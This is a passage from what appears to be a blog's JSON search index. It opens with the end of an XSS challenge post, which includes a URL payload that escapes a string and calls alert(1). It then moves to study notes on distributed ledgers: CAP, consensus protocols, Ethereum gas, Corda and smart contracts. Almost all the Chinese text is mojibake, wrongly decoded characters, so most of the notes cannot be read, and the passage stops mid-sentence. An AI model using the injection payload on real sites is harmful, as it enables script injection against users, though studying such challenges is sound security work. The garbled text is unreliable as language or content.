?arg01=id\u0026amp;arg02=\\%22))}catch(e){}if(!self.a)self.a=!alert(1)//%26width%26height ","date":"2022-05-18T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/xss_challenge_trip/","title":"XSS æŒ‘æˆ˜ä¹‹æ—…"},{"content":"DLC EXAM Preparation Notes Week 4 Byzantine Faults and CAP Theorem   Byzantine General Problems æ‹œå åº­å°†å†›é—®é¢˜ï¼Œä¹Ÿæ˜¯åˆ†å¸ƒå¼è®¡ç®—ä¸­çš„æŠ•ç¥¨é—®é¢˜\nå³å½“æœ‰9ä½å°†å†›ååŒä½œæˆ˜ï¼Œç°åœ¨ä»–ä»¬é‡åˆ°äº†éº»çƒ¦ï¼Œéœ€è¦å†³å®šæ˜¯æ’¤é€€è¿˜æ˜¯ç»§ç»­è¿›æ”»ï¼Œä»–ä»¬é€šè¿‡æŠ•ç¥¨æ¥å†³å®šæœ€åçš„å†³å®šï¼Œ4ä½è¿›æ”»ï¼Œ4ä½æ’¤é€€ï¼Œä¸€ä½èƒŒå›è€…å‘Šè¯‰ä¸€è¾¹ä»–ä»¬ä¼šè¿›æ”»ï¼Œå‘Šè¯‰å¦ä¸€è¾¹ä»–ä»¬ä¼šæ’¤é€€ï¼Œå¯¼è‡´ååŒä½œæˆ˜å¤±è´¥ã€‚ é‚£ä¹ˆBitcoinæ˜¯å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜çš„å‘¢ï¼Œå³ä½¿ç”¨PoWç®—æ³•ï¼Œä½¿å‘é€ä¸€æ¡è™šå‡çš„æ¶ˆæ¯çš„æˆæœ¬å˜å¾—å¾ˆé«˜     Database on ACID\nACID,å³æ˜¯ä¸ºäº†ä¿è¯æ•°æ®åº“çš„æ‰€æœ‰ä¸šåŠ¡çš„åŠç†æ˜¯å¯é çš„ï¼Œéœ€è¦å…·å¤‡çš„å››ä¸ªç‰¹æ€§çš„ç¼©å†™  Atomicity åŸå­æ€§ï¼Œå³æ‰€æœ‰çš„æ“ä½œéƒ½å¿…é¡»å®Œæ•´çš„è¿›è¡Œï¼Œå¦‚æœæœŸé—´å‘ç”Ÿé”™è¯¯ï¼Œå³æ•´ä¸€ä¸ªè¿‡ç¨‹å…¨éƒ¨å›æ»šï¼Œå½“ä½œæ²¡æœ‰å‘ç”Ÿè¿‡  Consistencyä¸€è‡´æ€§ï¼Œä¿è¯æ•°æ®åº“çš„å®Œæ•´æ€§æ²¡æœ‰è¢«ç ´åï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½éœ€è¦ç¬¦åˆæ ‡å‡†  Isolationéš”ç¦»æ€§ï¼Œå³é˜²æ­¢å¤šä¸ªæ“ä½œå¤„ç†åŒä¸€ä¸ªæ•°æ®ï¼Œå¯¼è‡´ç«äº‰å‡ºç°æ··ä¹±  DurabilityæŒä¹…æ€§ï¼Œæ‰€æœ‰çš„å¤„ç†å®Œæˆåéƒ½å¯ä»¥é•¿æœŸä¿å­˜ï¼Œä¸ä¼šä¸¢å¤±å’Œæ›´æ”¹   é‚£ä¹ˆå½“æ•°æ®åº“å˜å¤§äº†ä¹‹åï¼Œè¿™å››ä¸ªç‰¹æ€§å°±ä¼šæ”¶åˆ°æŒ‘æˆ˜ã€‚     CAP Theorem\nCAPä¸ºä¸‰ä¸ªå¯¹äºå®ç°åˆ†å¸ƒå¼æ•°æ®åº“çš„æŒ‘æˆ˜çš„ç®€å†™  Consistency of data,ä¸€è‡´æ€§ï¼Œæ‰€æœ‰çš„èŠ‚ç‚¹åœ¨è®¿é—®åˆ†å¸ƒå¼çš„æ•°æ®åº“æ—¶ï¼Œèƒ½å¤Ÿä¿è¯è®¿é—®çš„éƒ½æ˜¯æœ€æ–°çš„æ•°æ®  Availability of dataï¼Œå¯ç”¨æ€§ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½èƒ½è·å¾—ä¸æŠ¥é”™çš„å“åº”ï¼ˆä½†ä¸ä¿è¯è·å–çš„ä¸€å®šæ˜¯æœ€æ–°çš„æ•°æ®ï¼‰  Partition-toleranceï¼Œåˆ†åŒºå®¹é”™æ€§ï¼Œå½“ä¸€è‡´æ€§æ— æ³•è¡¨è¾¾çš„æ—¶å€™ï¼Œå°±ä¼šäº§ç”Ÿåˆ†æ­§ï¼Œ   æ ¹æ®å®šåŠ›ï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿåªèƒ½ä¿è¯ä¸‰é¡¹ä¸­çš„ä¸¤é¡¹ ä¸€èˆ¬æ¥è¯´ï¼ŒPartition-toleranceå¿…é¡»å¾—åˆ°ä¿è¯ï¼Œå› æ­¤åªèƒ½åœ¨Availabilityå’ŒConsistencyä¹‹é—´è¿›è¡Œé€‰æ‹©  é€‰æ‹©Consistencyä¸€è‡´æ€§ï¼Œé‚£ä¹ˆå“åº”çš„æ—¶é—´å¯èƒ½ä¼šå˜é•¿  é€‰æ‹©Availabilityï¼Œé‚£ä¹ˆéœ€è¦ä¿è¯å“åº”çš„æ—¶é—´æ˜¯å³æ—¶çš„     Consensus Protocols   Proof of Work (Pow)\nHow it works : é€šè¿‡è®©mining nodeé€šè¿‡æ”¹å˜block headerä¸­çš„nonceæ¥ä¸æ–­çš„æ”¹å˜block header hashçš„å€¼ï¼Œä½¿å…¶å°äºblock headerä¸­targetçš„å€¼ åæœ - å¤§é‡çš„èµ„æºæ¶ˆè€—ï¼Œè¿è¡Œç®—åŠ›æœºå™¨ä»¥åŠå†·å´æœºå™¨æ‰€è¦æ¶ˆè€—çš„ç”µè´¹  - å¤§é‡çš„è®¡ç®—ç¾¤ \u0026lt;br/\u0026gt; - é›†ä¸­çš„mining power \u0026lt;br/\u0026gt;      Proof of Stake (PoS)\nProof of Stakeä¸éœ€è¦å†å‘PoWé‚£æ ·æ¶ˆè€—å¤§é‡çš„ç®—åŠ›ä»¥åŠç”µåŠ›èµ„æºæ¥äº’ç›¸ç«äº‰ï¼Œæ°¸è¿œè¦è®°ä½ä¸€ç‚¹çš„å°±æ˜¯miningçš„è¿‡ç¨‹æœ¬èº«ä¸æ˜¯ä¸ºäº†åŠ å¯†è´§å¸ï¼Œè€Œæ˜¯ä¸ºäº†ç»´æŒæ•´ä¸€ä¸ªåŒºå—é“¾ä¸Šçš„å®‰å…¨ã€‚ æ¯”å¦‚ä»¥å¤ªåŠï¼Œä»–ä»¬è¦æ±‚æƒ³è¦æˆä¸º validator çš„ç”¨æˆ·æŠµæŠ¼ä¸€éƒ¨åˆ†çš„è™šæ‹Ÿè´§å¸ï¼Œç„¶åéšæœºé€‰æ‹©ä¸€åvalidatoræ¥è¿›è¡Œæ–°çš„blockçš„åˆ›é€ ä»¥åŠtransactionçš„éªŒè¯ï¼Œä½ æŠµæŠ¼çš„è¶Šå¤šï¼Œä¹Ÿå°±è¶Šå®¹æ˜“æˆä¸ºvalidatorã€‚ é‚£ä¹ˆå¦‚ä½•é¿å…ç”¨æˆ·çš„ä¸è‰¯è¡Œä¸ºå‘¢ï¼ŒPoWé€šè¿‡å¤§é‡çš„è¿ç®—æé«˜äº†æˆæœ¬ï¼Œè€ŒPoSä¸­ï¼Œåˆ™æ˜¯ä½¿ç”¨æŠµæŠ¼çš„æœºåˆ¶æ¥é˜²æ­¢äº§ç”Ÿä¸è‰¯çš„è¡Œä¸ºï¼Œå¦‚æœå‘ç”Ÿäº†ä»–ä»¬å°±ä¸§å¤±ä»–ä»¬æŠµæŠ¼çš„è™šæ‹Ÿè´§å¸ åœ¨PoSä¸­ï¼Œäººä»¬ä¼šå€¾å‘ä¸åˆä½œï¼Œè€Œä¸æ˜¯PoWä¸­çš„ç«äº‰ï¼Œä»–ä»¬å¯ä»¥å°†èµ„æºé›†ä¸­èµ·æ¥ï¼Œä»è€Œè·å¾—æ›´å¤§çš„æœºä¼šæ¥æˆä¸ºvalidator åœ¨PoSä¸­ï¼Œ51% attackå¯¹äºattackeræ¥è¯´ä¹Ÿååˆ†å±é™©ï¼Œå› ä¸ºä»–ä»¬éœ€è¦æŠµæŠ¼å¤§é‡çš„è´§å¸æ¥å¾—åˆ°validatorçš„åœ°ä½ï¼Œé‚£ä¹ˆä¸€æ—¦é­å—æƒ©ç½šï¼ŒæŸå¤±å°†ä¼šæ˜¯å·¨å¤§çš„     Proof of Authority\nBlockçš„åˆ›å»ºä»¥åŠtransactionçš„æ ¡éªŒå·¥ä½œè¢«è½®æµåˆ†é…åˆ°å¯ä¿¡çš„æƒå¨æœºæ„æˆ–è€…ç»„ç»‡èº«ä¸Šï¼Œè¿™äº›ç»„ç»‡å¯èƒ½éœ€è¦æŠµæŠ¼ä¸€éƒ¨åˆ†çš„èµ„é‡‘æ¥æˆä¸ºå¯é çš„èŠ‚ç‚¹ï¼Œè¿›å…¥è½®å€¼åˆ—è¡¨     Other turn-taking protocols\n Protocolæ¥ç›´æ¥å†³å®šé‚£ä¸ªèŠ‚ç‚¹æ¥å®Œæˆå·¥ä½œ  éšæœºåˆ†é…  è½®æµ    Proof of Elapsed Time (PoET) hardware:  åªæœ‰ç‰¹å®šçš„ç¡¬ä»¶æ‰èƒ½å®Œæˆå·¥ä½œ       Consensus attacks   Sybil attacks\nå¥³å·«æ”»å‡»ï¼Œæ”»å‡»è€…é€šè¿‡åˆ©ç”¨proxyä»£ç†æ¥ä¼ªé€ å¤šä¸ªèº«ä»½æ¥å¯¹æ•´ä¸€ä¸ªdecentralised consensusæœºåˆ¶è¿›è¡Œæ”»å‡»ï¼Œä½†åŒæ ·ä¹Ÿéœ€è¦å¤§é‡çš„hash powerï¼Œå› ä¸ºå³ä½¿ä½ æ§åˆ¶äº†å¾ˆå¤šèŠ‚ç‚¹ï¼Œé‚£ä¹Ÿéœ€è¦èƒ½å¤Ÿåœ¨è¿™äº›èŠ‚ç‚¹ä¸Šé¢æ¥å®ŒæˆPoWæ‰è¡Œ   Week 8: DLT Infrastructure \u0026amp; Platforms Bitcoin blockchainæœ€ä¸»è¦çš„ç›®çš„æ˜¯ä¸ºäº†é˜²ä½double-spendingï¼ˆé€šè¿‡å¢åŠ ä¿®æ”¹ä¸€ä¸ªblockæ‰€éœ€è¦çš„costï¼Œç‰¹åˆ«æ˜¯å½“å¤šä¸ªblockéƒ½ç¡®è®¤ä¿¡æ¯ä¹‹åï¼‰ Ethereum   What is Ethereum\nåœ¨Ethereumå®‡å®™ä¸­ï¼Œæœ‰ä¸€ä¸ªå”¯ä¸€çš„è™šæ‹Ÿçš„æœºå™¨å«åšEVMï¼ˆEthereum Virtual Machineï¼‰,æ‰€æœ‰å‚ä¸Ethereumç½‘ç»œçš„ç”¨æˆ·éƒ½è®¤å¯çš„ä¸€ä¸ªæœºå™¨ï¼Œç”¨æ¥è®°å½•æ•´ä¸ªç½‘ç»œåŒ…æ‹¬ç”¨æˆ·çš„çŠ¶æ€ã€‚ EVMç±»ä¼¼äºbitcoinä¸­æ¯ä¸€ä¸ªfull nodeæ‰€å­˜å‚¨çš„databaseï¼Œå½“æœ‰transactionäº§ç”Ÿä¹‹åï¼Œå°†ä¼šè¢«å¹¿æ’­åˆ°æ•´ä¸€ä¸ªEhthereumç½‘ç»œå½“ä¸­ï¼Œè¢«éªŒè¯å¹¶åŠ å…¥çš„æ–°çš„blockå½“ä¸­ï¼Œç„¶åä½œä¸ºä¸€æ¡æŒ‡ä»¤è¢«EVMåšæ‰§è¡Œï¼Œæ‰€æœ‰çš„nodeä¸Šéƒ½æœ‰ä¸€ä»½å®Œæ•´çš„EVMçš„æ‹·è´ï¼Œæ¯ä¸€æ¡transactionéƒ½ç›¸å½“äºæ˜¯å¯¹EVMè¿™ä¸ªæœºå™¨å‘å‡ºçš„æŒ‡ä»¤ï¼Œè®©å…¶è¿›è¡Œä¸€äº›æ“ä½œé€ æˆçŠ¶æ€çš„æ”¹å˜ã€‚ global computers     What is Ether\nEtherå°±æ˜¯Ethereumä¸­çš„æ‰€ä½¿ç”¨çš„cryptocurrencyï¼Œå…¶ä½œç”¨æ˜¯ä¸ºäº†æ¿€åŠ±minerç§¯æçš„è½¬å‘ï¼ŒéªŒè¯transactionï¼Œæ¥ç»´æŠ¤æ•´ä¸ªä¸€ä¸ªblockchainï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥é˜²æ­¢å‘ç”ŸDDoSæ”»å‡»ï¼Œå› ä¸ºæ¯ä¸ªtransactionéƒ½éœ€è¦æ”¯ä»˜ä¸€å®šçš„è´¹ç”¨ã€‚     What is Smart contracts\nSmart contracts æ™ºèƒ½åˆçº¦ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªä¸ªåœ¨EVMä¸Šçš„ç¨‹åºï¼ˆä¸€ç»„ä»£ç æŒ‡ä»¤ï¼‰ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å‘é€å¯¹åº”çš„å˜é‡å‚æ•°åŒæ—¶æ”¯ä»˜ä¸€å®šçš„Ethæ¥å‘èµ·ä¸€ä¸ªtransactionï¼Œè€Œä¸€ä¸ªminerè®²åœ¨å…¶æœ¬åœ°çš„EVMä¸Šçš„æ‰€å¯¹åº”çš„smart contractç¨‹åºä¸Šè¾“å…¥å‚æ•°æ‰§è¡Œè¿™ä¸ªç¨‹åºï¼Œå®Œæˆç›¸åº”çš„å·¥ä½œã€‚ ç¨‹åºå‘˜é€šè¿‡å‘EVMä¸­ä¸Šä¼ è¿™äº›å¼€å‘çš„æ™ºèƒ½åˆçº¦ç¨‹åºï¼Œå°±å¯ä»¥åœ¨EVMçš„åŸºç¡€ä¸Šæ­å»ºåº”ç”¨ç¨‹åºä¾›ç”¨æˆ·è°ƒç”¨ä½¿ç”¨ã€‚ åŒæ—¶ä¹Ÿè¢«å«åšdapps, or Decentralised Apps.     Transaction\nEthereumä¸­çš„transactionæ˜¯ä¸°å¯Œå¤šæ ·çš„ï¼Œä¾‹å¦‚ï¼š  Send X ether from my account to Alice\u0026rsquo;s account.  Publish some smart contract code into EVM state.  Execute the code of the smart contract at address X in the EVM, with arguments Y.       GAS\nGASï¼Œæ±½æ²¹ï¼Œé¡¾åæ€ä¹‰ï¼Œæ˜¯ç”¨æ¥é©±åŠ¨Ethereumå·¥ä½œçš„ä¸€ä¸ªä¸œè¥¿ã€‚ æˆ‘ä»¬ä»ä¸Šé¢çš„ä»‹ç»ä¸­äº†è§£ï¼Œç”¨æˆ·å¯ä»¥å‘èµ· transaction æ¥è½¬ç§»ETH,ä¹Ÿå¯ä»¥å‘é€å¯¹åº”çš„å‚æ•°æ¥æ‰§è¡Œsmart contracts,é‚£ä¹ˆè¿™äº›å·¥ä½œéƒ½éœ€è¦æ¶ˆè€—è®¡ç®—æœºèµ„æºï¼Œé‚£ä¹ˆGASå°±ä½œä¸ºè´¹ç”¨æ¥é©±åŠ¨è®¡ç®—æœºèµ„æºä¸ºç”¨æˆ·æœåŠ¡ï¼Œ GAS cost :\nä½ éœ€è¦æ‰§è¡Œå¤šå¤§çš„smart contractsç¨‹åº ä½ éœ€è¦æ‰§è¡Œçš„é€Ÿåº¦æœ‰å¤šå¿« Gas price (measure in ETH) ç”¨æˆ·åœ¨å‘èµ·transactionçš„æ—¶å€™å¯ä»¥å†³å®šæƒ³è¦èŠ±è´¹å¤šå°‘GASæ¥ä½œä¸ºæŠ¥é…¬ Total processing fee in ETH = Gas limit (total # of gas to be used) X gas price in ETH. Transactionçš„æ‰§è¡Œå…·æœ‰AtomicityåŸå­æ€§ï¼ˆæˆ‘è§‰å¾—æ˜¯è¿™æ ·ï¼‰ï¼Œå³å¦‚æœtransactionçš„æ‰§è¡Œå¤±è´¥äº†ï¼Œæˆ–è€…æœªå®Œæˆï¼Œgasä¸ä¼šé€€å›ï¼Œå› ä¸ºç¡®å®å·²ç»å ç”¨äº†è®¡ç®—æœºèµ„æºï¼Œä½†æ˜¯EVMçš„çŠ¶æ€ä¸ä¼šå‘ç”Ÿä»»ä½•æ”¹å˜ã€‚   Why have Ethereum Gas?\nå¯ä»¥ç”¨äºå‡å°‘infinite loops ä»¥åŠé˜²æ­¢DoS attackçš„å‘ç”Ÿï¼Œ å› ä¸ºæœ€ç»ˆæ”¯ä»˜çš„æœ‰é™çš„Gaså°†è¢«ç”¨å®Œï¼Œå¹¶ä¸”attackeréœ€è¦ä»˜å‡ºgasæ‰èƒ½ç»§ç»­å·¥ä½œ       Cryptokitties problem\nCryptokittiesåˆšå‡ºæ¥çš„æ—¶å€™ï¼Œå¤§é‡çš„transactionçªç„¶æ¶Œå…¥æ•´ä¸€ä¸ªEthereumï¼ŒMinersæé«˜äº†ä»–ä»¬çš„gaså‡ ä¸ªï¼Œå¯¼è‡´å¾ˆå¤šè€çš„ç”¨æˆ·è¿˜åœ¨è‡ªåŠ¨çš„æ”¯ä»˜è¾ƒä½çš„gasï¼Œå¯¼è‡´å¾ˆå¤štransactionå¹¶ä¸ä¼šè¢«å¤„ç†ä¸æ‰§è¡Œ è§£å†³çš„æ–¹æ³•ï¼š  çŸ­æœŸï¼šä¿®æ”¹å‰ç«¯é¡µé¢æ¥å…è®¸ç”¨æˆ·å¢åŠ ä»–ä»¬çš„gasè´¹ç”¨å¹¶é‡æ–°æäº¤transaction  é•¿æœŸï¼šå°†ç±»ä¼¼çš„appè½¬ç§»åˆ°sidechainsæ¥æ‰§è¡Œï¼Œå³åªæœ‰ä¸€éƒ¨åˆ†äººå¯ä»¥æ‰§è¡Œå’Œè¿è¡Œç‰¹å®šçš„transactionï¼Œè€Œä¸ä¼šå½±å“ä¸»é“¾ä¸Šçš„nodes       Ethereum Enterprise\nä¼ä¸šå’Œç»„ç»‡å¯ä»¥åœ¨Ethereumä¸Šå¼€è¾Ÿpermissioned chainsæ¥å®ç°è‡ªå·±çš„ä¸€ä¸ªblockchainï¼Œä»–ä»¬ä¼šé‡æ–°å¼€å‘EVMçš„codeæ¥æ¥æ”¶å’Œè½¬å‘ç‰¹å®šçš„transactionï¼Œè¿™äº›transactionä¸ä¸»é“¾ä¸Šçš„nodeå¹¶ä¸å…¼å®¹ï¼Œä½†æ˜¯å´å¯ä»¥åœ¨ç‰¹å®šçš„ä¸€äº›å‚ä¸åˆ°è¿™ä¸ªsidechainä¸Šçš„nodeä¹‹é—´è¿›è¡Œäº¤äº’   Corda designed for private transactions enterprise version is called R3 Corda. Design   Consensus åªæœ‰å‚ä¸æœ¬æ¬¡transactionçš„æœºæ„æ‰èƒ½çœ‹åˆ°å’Œå‚ä¸è¿™ä¸ªtransaction   Validation åªæœ‰åˆæ³•çš„åˆ©ç›Šç›¸å…³è€…æ‰ä¼šè¿›è¡Œtransactionçš„éªŒè¯   Use of Independent notaries ç‹¬ç«‹çš„ç¬¬ä¸‰æ–¹å…¬è¯å¤„ä¼šå¸®åŠ©å®Œæˆæ—¶é—´çš„éªŒè¯ï¼ˆä»€ä¹ˆæ—¶å€™åšå‡ºçš„äº¤æ˜“ï¼‰ï¼Œä»¥åŠé˜²æ­¢transactionå‘ç”Ÿä¸¤æ¬¡   Focus on inter-operability ç¡®ä¿æ³•å¾‹æ¡æ–‡èƒ½å¤Ÿç»‘å®šï¼Œä»¥åŠè€æ—§çš„å†…éƒ¨ç³»ç»Ÿèƒ½å¤Ÿå‚ä¸åˆä½œ     Cordaçš„ç‰¹æ€§\n  Transactions private to the parties involved â€“ Witnessed by notaries åªæœ‰å…¬è¯å¤„æ‰èƒ½çœ‹å¾—åˆ° â€“ Only participants to a transaction can view it åªæœ‰å‚ä¸transactionçš„ç»„ç»‡æ‰èƒ½çŸ¥é“transactionçš„å­˜åœ¨ä¸å‚ä¸å…¶ä¸­     No single chain   No global state   No native crypto-currency   Records an explicit link between legal code and smart contracts   Supports a variety of consensus mechanisms   Can include transaction within arbitrary workflows.   Cordaä¸­ä¹Ÿæ²¡æœ‰blockçš„æ¦‚å¿µï¼Œæ‰€æœ‰çš„transactionéƒ½æ˜¯å®æ—¶å¤„ç†çš„ï¼Œæ„å‘³ç€ä¸éœ€è¦ç­‰å¾…blockè¢«æ·»åŠ æ‰èƒ½è¢«ç¡®è®¤ï¼Œ é‡‘èæœºæ„å¯¹Cordaæ„Ÿå…´è¶£çš„ä¸»è¦åŸå› å°±æ˜¯å¯ä»¥è‡ªåŠ¨åŒ–ç¹ççš„å·¥ä½œæµï¼Œæ¯”å¦‚å­¦æ ¡çš„æ³¨å†Œï¼Œå°±éœ€è¦ä¸€ç³»åˆ—çš„å·¥ä½œæµï¼Œä»–ä»¬å¦‚æœèƒ½è¢«è‡ªåŠ¨åŒ–ï¼Œå¹¶è®°å½•åœ¨blockchainä¸Šé¢ï¼Œå°±ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚ https://www.r3.com/blockchain-101/ Peers have a single shared ledger â€” once the transaction is validated, the record is permanent, secure and immutable. A smart contract â€” code running on top of a blockchain that contains a set of rules under which the parties mutually agree â€” eliminates the need for third parties. Owner of the transaction has the power to move anything of value freely and instantly without intermediaries. Eliminates or reduces paper processes, need for intermediaries, speeds up transaction times and increases efficiencies and transparency.   Hyperledger a family of platforms ä½œä¸ºåŸºç¡€è®¾æ–½ï¼Œç„¶ååŠ å…¥çš„ç»„ç»‡å¯ä»¥åœ¨å…¶åŸºç¡€è®¾æ–½ä¸Šæ­å»ºè‡ªå·±çš„æœåŠ¡ Different large IT companies, financial institutions join the Hyperledger as members and run a family of platforms ç”¨æˆ·å¯ä»¥é€‰æ‹©åŠ å…¥è¿™äº›platformsä¹Ÿå¯ä»¥å¯»æ±‚è¿™äº›ç»„ç»‡æä¾›æœåŠ¡ Other technologies ä¸€ä¸ªå¸¸è§çš„æ‰¹è¯„çš„å£°éŸ³å°±æ˜¯ï¼šä½ å®é™…ä¸Šä¸éœ€è¦ä¸€ä¸ªåˆ†å¸ƒå¼è´¦æœ¬å¹³å°ï¼Œå› ä¸ºä½¿ç”¨é›†ä¸­å¼çš„æ•°æ®åº“ä¸€æ ·å¯ä»¥å­˜å‚¨éšç§ä¿¡æ¯ ä½†æ˜¯è¿™ä»ç„¶é¢ä¸´å¾ˆå¤šçš„å¨èƒï¼š  ç¬¬ä¸‰æ–¹æ•°æ®åº“çš„å®‰å…¨æ€§ï¼Œä»¥åŠä»·æ ¼çš„æ”¯å‡º  å¦‚ä½•ä¿è¯æ•°æ®åº“ä¸è¢«æ”»å‡»æˆ–è€…è¢«ç¬¬ä¸‰æ–¹æ•°æ®åº“æ‰€åˆ©ç”¨ï¼Ÿ    ç¦æ­¢åˆä½œä¼™ä¼´æŒæœ‰ç«äº‰å¯¹æ‰‹çš„æ•°æ®  å› æ­¤æ¯ä¸€ä¸ªä¼ä¸šéƒ½éœ€è¦å°†æ•°æ®å­˜å‚¨åœ¨ç¬¬ä¸‰æ–¹çš„æ•°æ®åº“ä¸­     Week 9: Smart Contracts å½“æˆ‘ä»¬åœ¨è‡ªåŠ¨è´©å–æœºä¹°é¥®æ–™çš„æ—¶å€™ï¼Œæˆ‘ä»¬æŠ•å…¥ç¡¬å¸ï¼Œç„¶åé€‰æ‹©æƒ³è¦çš„é¥®æ–™ï¼Œç„¶åé¥®æ–™æ‰å‡ºæ¥ï¼Œè¿™å…¶å®å®Œæˆäº†ä¸€ä¸ªéšæ€§çš„åˆçº¦ï¼Œå°±æ˜¯ä½ ä»˜å‡ºäº†ä¸€å®šçš„é’±ï¼Œæœºå™¨æŠŠå¯¹åº”çš„å•†å“äº¤ä»˜ç»™ä½ ï¼Œè¿™ä¸ªå·¥ä½œç”±è‡ªåŠ¨è´©å–æœºå®Œæˆï¼Œè€Œä¸éœ€è¦å†ç­¾ç½²ä¸€ä»½åˆåŒï¼Œæ¥è¿›è¡Œäº¤ä»˜ã€‚ Smart contracts,æ™ºèƒ½åˆçº¦å°±æ˜¯ä¸ºäº†å®ç°è¿™æ ·ä¸€ä¸ªæ¦‚å¿µï¼Œä½†æ˜¯å°±å¦‚åŒMiningæŒ–çŸ¿çš„ç›®çš„æ˜¯ä¸ºäº†ç»´æŠ¤å»ä¸­å¿ƒåŒ–çš„å…±è¯†æœºåˆ¶çš„å®‰å…¨ä¸€æ ·ï¼Œsmart contractså¹¶ä¸æ˜¯ä¸¥æ ¼æ„ä¹‰ä¸Šçš„åˆåŒï¼Œå®ƒçš„æœ¬è´¨ä¸Šè¿è¡Œåœ¨åˆ†å¸ƒå¼è´¦æœ¬ä¸Šçš„ä¸€ä¸ªç¨‹åºï¼Œèƒ½å¤Ÿè‡ªåŠ¨çš„æ¥å—å‚æ•°ç„¶åè¿›è¡Œè¿è¡Œ Bitcoinçš„scriptå…¶å®å°±æ˜¯ä¸€ä¸ªå¾ˆåŸºç¡€çš„æ™ºèƒ½åˆçº¦ï¼Œtransactionä¸­çš„locking script \u0026amp; unlocking scriptåˆåœ¨ä¸€èµ·å°±å¯ä»¥å®ç°UTXOçš„èŠ±è´¹ï¼Œä½†æ˜¯ç”±äºBitcoinæœ¬èº«è®¾è®¡çš„é™åˆ¶ï¼Œscriptæ²¡æœ‰å¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œä¸èƒ½å¾ªç¯æˆ–è€…é€’å½’ï¼Œæ˜¯å›¾çµä¸å®Œå¤‡çš„ã€‚ é‚£ä¹ˆå¦‚æœæˆ‘ä»¬è®¾è®¡ä¸€ä¸ªæ›´ä¸ºå¼ºå¤§çš„è®¡ç®—æœºè¯­è¨€ï¼Œä½¿å…¶å›¾çµå®Œå¤‡ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯å°±èƒ½å®Œæˆæ›´æœ‰åˆ›é€ æ€§çš„åŠŸèƒ½å‘¢ï¼Œè¿™ä¹Ÿå°±æ˜¯Ethereumçš„å‡ºç°ä»¥åŠSolidityè¯­è¨€çš„å®ç°ã€‚ æ¯ä¸€ä¸ªsmart contractç¨‹åºåœ¨è¿è¡Œçš„æ—¶å€™éƒ½å¯ä»¥åœ¨åˆ†å¸ƒå¼è´¦æœ¬ä¸Šä¿®æ”¹å…¶ç‰¹å®šçš„æ•°æ®ï¼Œå¯ä¾›ä½¿ç”¨çš„æ•°æ®å½“ç„¶ä¹Ÿæœ‰ä¸€ç³»åˆ—çš„é™åˆ¶ã€‚ Smart contract and trust æˆ‘ä»¬å¯ä»¥è¯´ï¼Œsmart contractç¨‹åºï¼ˆç›¸è¾ƒäºæ™®é€šçš„ç¨‹åºï¼‰å°†ä¿¡ä»»åŠ å…¥äº†ç³»ç»Ÿï¼Œå› ä¸ºæ‰€æœ‰çš„ä»£ç éƒ½å­˜åœ¨äºæ•´ä¸€ä¸ªåˆ†å¸ƒå¼è´¦æœ¬ä¸Šï¼Œå¹¶ä¸”æ‰€æœ‰çš„æ“ä½œéƒ½ä¼šè¢«æ‰€æœ‰çš„èŠ‚ç‚¹ç‹¬ç«‹çš„éªŒè¯ï¼Œå¹¶ä¸”ä¼šæ°¸ä¹…è¢«ä¿å­˜ï¼Œç†è®ºä¸Šæ— æ³•è¢«ä¿®æ”¹ã€‚åŒæ—¶è¿™äº›æ“ä½œå°†ä¼šè¢«è‡ªåŠ¨æ‰§è¡Œã€‚ å…³äºåå­— å…¶å®æ™ºèƒ½åˆçº¦å¹¶ä¸æ™ºèƒ½ï¼Œä»–ä»¬åªæ˜¯ä¸€ç»„ä»£ç å¯ä»¥è¢«è‡ªåŠ¨æ‰§è¡Œï¼Œä»…æ­¤è€Œå·²ï¼ˆæˆ‘ä»¬è¯´çš„æ™ºèƒ½ä¸€èˆ¬ä¼šè”ç³»åˆ°AIä¹‹ç±»çš„æ–¹å‘ï¼‰ å…¶å®æ™ºèƒ½åˆçº¦ä¸æ˜¯ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„åˆçº¦ï¼Œå¯èƒ½åªæ˜¯ä¸€æ¬¡ç®€å•çš„åŠ å¯†è´§å¸çš„äº¤æ˜“ï¼Œå¦‚æœéœ€è¦åŠ ä¸Šæ³•å¾‹æ¡æ–‡ï¼Œéœ€è¦é¢å¤–çš„æœåŠ¡ï¼Œå¹¶ä¸”ä¹Ÿä¸ä¸€å®šæ˜¯ä¸¤ä¸ªç»„ç»‡ä¸ºäº†è¾¾æˆæŸäº›äº¤æ˜“è€Œè¯ç”Ÿçš„åˆåŒã€‚ What are agreements in the context of distributed ledgers?  æ³•å¾‹åˆåŒï¼ˆäººä»¬èƒ½å¤Ÿè¯»å¾—æ‡‚çš„ï¼‰  éšæ€§çš„åˆåŒï¼ˆè‡ªåŠ¨è°ƒç”¨çš„è®¡ç®—æœºæ“ä½œï¼Œprotcolsä¹‹ç±»çš„ï¼‰   Stampery servie Stamperyæ˜¯ä¸€é¡¹å¯ä»¥æä¾›åˆåŒè¯æ˜æœåŠ¡ï¼Œå³åˆåŒæ˜¯å¦è¾¾æˆï¼Œåœ¨ä½•æ—¶è¾¾æˆï¼Ÿ ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚ä½ ä¸æˆ¿ä¸œè¾¾æˆäº†ç§Ÿæˆ¿åˆåŒï¼Œç„¶åä½ ä»¬å„æœ‰ä¸€ä»½ç»è¿‡ç­¾å­—çš„åˆåŒï¼Œä½ å¯ä»¥é€šè¿‡StamperyæœåŠ¡æ¥å°†å…¶ä¸Šä¼ åˆ°åˆ†å¸ƒå¼è´¦æœ¬ä¸­è¿›è¡Œä¿å­˜ï¼š  é¦–å…ˆä»–ä»¬ä¼šhashè¿™ä»½ç”µå­çš„åˆåŒ  ç„¶åå°†è¿™ä¸ªhashå€¼ä¸å…¶ä»–éœ€è¦çš„hashä¸€èµ·ç»„æˆç§°merkle tree  æ¥ç€ä¸Šä¼ åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªåˆ†å¸ƒå¼è´¦æœ¬ä¸­   é‚£ä¹ˆå½“ä½ 